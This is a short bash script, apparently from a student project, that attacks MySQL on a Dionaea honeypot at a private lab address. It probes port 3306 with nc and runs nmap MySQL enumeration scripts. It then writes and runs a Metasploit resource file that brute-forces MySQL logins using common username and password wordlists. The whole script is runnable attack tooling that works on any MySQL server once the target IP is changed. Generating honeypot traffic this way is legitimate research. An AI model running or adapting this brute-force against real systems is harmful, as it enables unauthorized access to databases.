#!/bin/bash
# MySQL exploitation - targets Dionaea

DIONAEA="172.16.0.30"
LOGDIR="/home/kali/Desktop/fyp/attack_scripts/logs/exploitation"
USERS="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
PASS="/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt"

mkdir -p "$LOGDIR"

echo "MySQL exploitation on $DIONAEA"

if nc -zw2 "$DIONAEA" 3306 2>/dev/null; then
    nmap -p 3306 --script mysql-info,mysql-enum "$DIONAEA" -oN "$LOGDIR/mysql_nmap_${DIONAEA}.txt"
    
    RCFILE="/tmp/msf_mysql_${DIONAEA}.rc"
    cat > "$RCFILE" << EOF
use auxiliary/scanner/mysql/mysql_version
set RHOSTS $DIONAEA
run
use auxiliary/scanner/mysql/mysql_login
set RHOSTS $DIONAEA
set USER_FILE $USERS
set PASS_FILE $PASS
set STOP_ON_SUCCESS true
run
exit
EOF
    timeout 180 msfconsole -q -r "$RCFILE" 2>/dev/null > "$LOGDIR/mysql_msf_${DIONAEA}.txt"
    rm -f "$RCFILE"
else
    echo "MySQL not open"
fi

echo "Done"
